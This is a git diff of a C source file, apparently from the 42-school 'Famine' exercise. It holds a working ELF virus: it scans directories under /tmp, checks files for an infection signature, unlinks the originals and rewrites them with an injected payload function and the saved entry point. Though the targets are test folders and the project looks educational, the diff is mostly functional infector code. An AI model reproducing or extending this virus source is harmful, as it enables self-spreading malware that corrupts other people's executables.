@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/05/29 05:17:51 by root             ###   ########.fr       */
+/*   Updated: 2018/05/30 06:42:16 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -23,32 +23,33 @@
 
 #define OPEN		2
 #define CLOSE		3
-#define MSYNC		26
-#define GETDENTS64	217
 #define LSEEK		8
 #define MMAP		9
 #define MUNMAP		11
+#define UNLINK		87
+#define GETDENTS64	217
+
+
+void			find_files(char *dir);
+void			get_dat_elf(char *dir, char *file);
+void			pack_dat_elf(char *path, int size, char *data);
+int				check_signature(char *data, Elf64_Phdr *iprogram);
+void			famine64_func(void);
+extern uint32_t	famine64_size;
+
 
 struct linux_dirent64 {
-	ino_t        d_ino;    /* 64-bit inode number */
-	off_t        d_off;    /* 64-bit offset to next structure */
+	ino_t          d_ino;    /* 64-bit inode number */
+	off_t          d_off;    /* 64-bit offset to next structure */
 	unsigned short d_reclen; /* Size of this dirent */
 	unsigned char  d_type;   /* File type */
 	char           d_name[]; /* Filename (null-terminated) */
 };
 
-char		*direct[] = { "/tmp/test/", "/tmp/test2/", NULL };
-
-void	find_files(char *dir);
-void	get_dat_elf(char *dir, char *file);
-void	pack_dat_elf(char *path, int size, char *data);
-void	famine64_func(void);
-extern uint32_t	famine64_size;
-
 int main(int ac, char **av)
 {
-	/* ft_printf("%x\n", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC); */
-	/* ft_printf("%d + %d = %d\n", sizeof(unsigned long), sizeof(unsigned short), sizeof(unsigned long) * 2 + sizeof(unsigned short)); */
+	char	*direct[] = { "/tmp/test/", "/tmp/test2/" };
+
 	find_files(direct[0]);
 	find_files(direct[1]);
 	return 0;
@@ -64,13 +65,13 @@ void	find_files(char *dir)
 	fd = syscall(OPEN, dir, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0);
 	if (fd == -1)
 		return ;
-	while ((ret = syscall(GETDENTS64, fd, buff, 1023)) > 0)
+	while ((ret = syscall(GETDENTS64, fd, buff, 1024)) > 0)
 	{
 		off = 0;
 		while (off < ret)
 		{
 			if (*(buff + off + 8+8+2) == DT_REG)
-				get_dat_elf(dir, buff + off + 8 + 8 + 2 + 1);
+				get_dat_elf(dir, buff + off + 8+8+2+1);
 			off = off + *(buff + off + 16);
 		}
 	}
@@ -105,10 +106,10 @@ void	get_dat_elf(char *dir, char *file)
 		return ;
 	}
 	size = syscall(LSEEK, fd, 1, SEEK_END);
-	if (size == -1)
+	if (size <= 0)
 	{
 		write(1, "SEEK file failed\n", 17);
-		close(fd);
+		syscall(CLOSE, fd);
 		return ;
 	}
 
@@ -116,7 +117,7 @@ void	get_dat_elf(char *dir, char *file)
 	if (data == MAP_FAILED)
 	{
 		write(1, "MMAP file failed\n", 17);
-		close(fd);
+		syscall(CLOSE, fd);
 		return ;
 	}
 	syscall(CLOSE, fd);
@@ -145,11 +146,12 @@ void		pack_dat_elf(char *path, int size, char *data)
 		}
 		if (iprogram == NULL)
 			return ;
-		uint32_t sign = *(data + iprogram->p_offset + iprogram->p_memsz);
-		if (sign == 0x42CAFE42)
+		if (check_signature(data, iprogram))
 			return ;
 
 		/* Extra: Change the offset of sections higher than our code offset, for debug. */
+		syscall(UNLINK, path);
+
 		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
 		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
@@ -179,25 +181,29 @@ void		pack_dat_elf(char *path, int size, char *data)
 		}
 		/* Get the offset in file to write our code */
 		size_t off = iprogram->p_offset + iprogram->p_memsz - famine64_size;
-		if (write(fd, data, off) <= 0)
-		{
-			perror("WRITE failed");
+		if (write(fd, data, off) < 0)
 			return ;
-		}
-
-		if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) <= 0)
+		if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) < 0)
 			return ;
-
-		if (write(fd, &old_entry, sizeof(old_entry)) <= 0)
+		if (write(fd, &old_entry, sizeof(old_entry)) < 0)
 			return ;
-
-		if (write(fd, data + off, size - off) <= 0)
+		if (write(fd, data + off, size - off) < 0)
 			return ;
 		syscall(CLOSE, fd);
 	}
 }
 
+int		check_signature(char *data, Elf64_Phdr *iprogram)
+{
+	char *ptr = (data + iprogram->p_offset + iprogram->p_memsz - 16);
+	uint32_t sign = *(uint32_t*)ptr;
+	ptr = (data + iprogram->p_offset + iprogram->p_memsz - 12);
+	uint32_t sign4 = *(uint32_t*)ptr;
+	return (sign == 0x42CAFE42 && sign4 == 0x24EFAC24);
+}
+
 /*
+
 		typedef struct
 		{
 16			unsigned char e_ident[EI_NIDENT];
